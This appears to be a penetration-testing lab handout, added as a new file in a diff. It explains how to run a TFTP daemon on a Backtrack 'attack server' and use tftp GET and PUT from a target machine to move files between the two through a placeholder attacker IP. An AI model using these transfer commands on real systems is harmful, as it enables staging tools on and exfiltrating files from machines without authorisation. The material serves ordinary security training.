@@ -1,0 +1,25 @@
+TFTP Instructions
+TFTP instructions:
+
+On your Linux Attack server (old version of the attack server)
+
+You need to start the TFTP service on your Attack server
+K-Menu – Services – TFTPD – Start TFTPD
+You will get a message saying that the service is running on port 69
+Note that the directory TFTP pulls from is /tmp, any file you want to transfer using TFTP needs to be in this directory
+On your Target server open a command prompt
+
+Create a directory to place your files in
+Execute the following command to upload your file from your Attack server to the Target server:
+       i.     Tftp –i aaa.bbb.ccc.dde GET filename (where aaa.bbb.ccc.dde is your attack server IP address)
+If you want to download a file from your target server to your Attack server, execute the following:
+       i.     Tftp –i aaa.bbb.ccc.dde PUT filename (where aaa.bbb.ccc.dde is your attack server IP address)
+ 
+
+On Backtrack 5 (installed from the disk) you may have to do the following to enable TFTP
+
+install the program "atftpd". You can do this by typing the following in a terminal window:
+apt-get install atftpd
+Then, in the terminal window type:
+atftpd --daemon --port 69 --bind-address linux_attack_server_ip_address /tmp
+This activates the tftp daemon on port 69 and binds the program to your Linux attack server, and uses the /tmp directory for uploads and downloads.
